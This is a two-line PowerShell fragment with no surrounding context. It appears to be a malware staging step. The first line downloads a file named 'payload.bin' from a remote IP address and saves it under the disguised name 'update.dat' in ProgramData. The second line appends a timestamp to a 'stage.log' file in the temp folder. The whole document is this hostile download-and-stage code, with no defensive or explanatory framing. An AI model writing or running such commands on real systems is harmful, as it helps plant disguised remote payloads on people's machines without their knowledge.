
Invoke-WebRequest -Uri 'https://192.0.2.248/payload.bin' -OutFile "C:\ProgramData\update.dat" -UseBasicParsing
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
